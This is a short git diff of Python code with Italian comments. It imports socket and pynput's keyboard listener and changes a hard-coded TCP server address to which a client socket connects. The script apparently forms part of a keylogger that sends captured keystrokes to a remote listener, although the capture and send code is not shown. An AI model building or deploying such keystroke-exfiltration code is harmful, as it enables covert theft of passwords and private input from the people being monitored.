@@ -2,7 +2,7 @@ import socket
 from pynput import keyboard
 
 # Definizione dell'indirizzo del server
-server_tcp_address = ("192.168.1.21", 12345)
+server_tcp_address = ("192.168.69.19", 12345)
 
 # Creazione del socket TCP del client
 client_tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
